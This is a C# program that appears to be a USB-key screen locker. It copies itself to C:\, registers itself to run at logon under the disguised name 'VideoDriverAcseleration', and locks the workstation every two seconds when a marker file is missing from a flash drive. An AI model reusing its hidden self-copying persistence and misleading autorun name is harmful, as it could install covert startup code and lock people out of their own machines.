using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace FlashkaLisr
{
    class Program
    {
        static void Main(string[] args)
        {
            string NameAutoRun = "VideoDriverAcseleration";
            bool AutoRunExists = false;
            string root = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string fileName = Path.GetFileName(root);
            string NewPathFile = Path.Combine(@"C:\", fileName);
            RegistryKey AutoRun = Registry.CurrentUser
                .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            Console.WriteLine(NewPathFile);
            if (!File.Exists(NewPathFile) && root != NewPathFile)
            {
                File.Copy(root, NewPathFile);
            }
            foreach (string RegKey in AutoRun.GetValueNames())
            {
                if (RegKey == NameAutoRun)
                {
                    AutoRunExists = true;
                    break;
                }
            }
            if (!AutoRunExists)
            {
                AutoRun.SetValue(NameAutoRun, NewPathFile);
                AutoRun.Close();
            }
            Thread loc = new Thread(new ThreadStart(Locker));
            loc.Start();
        }
        public static List<string> GetFlashka()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            List<string> Flash = new List<string>(1);
            foreach (DriveInfo d in allDrives)
            {
                if (d.DriveType.ToString() != "Removable") // Только флешки
                {
                    continue;
                }
                Flash.Add(d.Name);
            }
            return Flash;
        }
        static void Locker()
        {
            string FileName = "Mark7546.usb";
            List<string> drives = GetFlashka();
            while (true)
            {
                foreach (string s in drives)
                {
                    string fi = s + FileName;
                    if (!File.Exists(fi))
                    {
                        System.Diagnostics.Process.Start(@"C:\WINDOWS\system32\rundll32.exe", "user32.dll,LockWorkStation");
                        break;
                    }
                    else
                    {
                        continue;
                    }
                }
                Thread.Sleep(2000);
            }
            
        }
    }
}
